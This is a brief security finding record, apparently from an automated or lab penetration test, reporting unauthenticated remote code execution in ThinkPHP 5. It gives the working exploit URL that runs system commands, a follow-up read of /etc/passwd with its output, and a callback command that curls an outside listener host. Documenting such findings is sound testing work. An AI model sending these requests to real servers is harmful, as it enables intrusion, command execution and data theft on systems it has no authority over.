findings.reported_class: Unauthenticated remote code execution (ThinkPHP 5 invokefunction route / function-call injection)
findings.evidence: Request: GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id returned command output in the HTTP response: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Follow-up command `cat /etc/passwd` returned local file contents including `root:x:0:0:root:/root:/bin/bash` and `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`. A callback proof was also triggered with `id;curl http://host.docker.internal:53900/ea04221fb89136b68092a684dc0c413c/index.php`, and the HTTP response showed `okok` after the id output.
